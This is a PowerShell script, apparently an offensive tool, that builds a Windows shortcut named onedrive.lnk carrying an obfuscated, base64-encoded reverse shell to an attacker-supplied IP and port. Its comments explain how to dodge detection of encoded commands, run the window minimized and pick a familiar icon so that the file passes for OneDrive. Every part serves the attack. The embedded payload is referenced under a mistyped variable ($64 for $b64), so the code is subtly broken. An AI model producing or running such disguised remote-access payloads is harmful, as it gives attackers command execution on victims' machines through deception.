param([string]$ip,[string]$port)

#reverse shell
$code=@'
$x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.asciie''ncoding).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
'@ -replace '~',$ip -replace '\^',$port

#convert code to base64
$b64 = [Convert]::ToBase64String(([System.Text.Encoding]::ascii.GetBytes($code)))

#making the lnk file
$WshShell = New-Object -comObject WScript.Shell

#I guess you could change the output folder if you want
$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\onedrive.lnk")
$Shortcut.RelativePath =  "powershell"

#edit here if you want a different icon, no it doesn't save the icon to it so i'd pick a popular path one target will have
#$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
$Shortcut.TargetPath = "powershell"

#fist bit is to decode the base64 then execute it, avoids using -encodedCommand switch which gets flagged a lot
$Shortcut.Arguments = ("[text.encoding]::ascii.getstring([convert]::('fr'+'om'+'base6'+'4st'+'ri'+'ng')('"+$64+"'))|powershell")

#start powershell minimized and then you can hide it
$Shortcut.WindowStyle = 7
$Shortcut.Save()
